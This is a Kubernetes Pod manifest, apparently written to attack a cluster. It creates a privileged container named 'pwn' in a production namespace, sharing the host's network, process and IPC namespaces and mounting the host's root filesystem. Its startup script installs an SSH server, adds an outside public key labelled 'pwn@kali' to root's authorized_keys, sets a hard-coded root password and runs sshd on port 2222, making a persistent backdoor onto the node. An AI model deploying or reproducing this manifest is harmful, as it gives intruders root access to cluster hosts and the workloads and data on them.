apiVersion: v1
kind: Pod
metadata:
  name: network-access-v2
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwn
    image: alpine:latest
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c"]
    args:
    - |
      apk add --no-cache openssh openssh-server curl kubectl bash
      mkdir -p /root/.ssh
      echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDmb+PXoiTzwoGtIyoos4AqvF2qp8MwGRthRYKGT+YDW pwn@kali" > /root/.ssh/authorized_keys
      chmod 700 /root/.ssh
      chmod 600 /root/.ssh/authorized_keys
      echo 'root:pwnadmin2026' | chpasswd
      ssh-keygen -A
      /usr/sbin/sshd -p 2222
      sleep 36000
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /

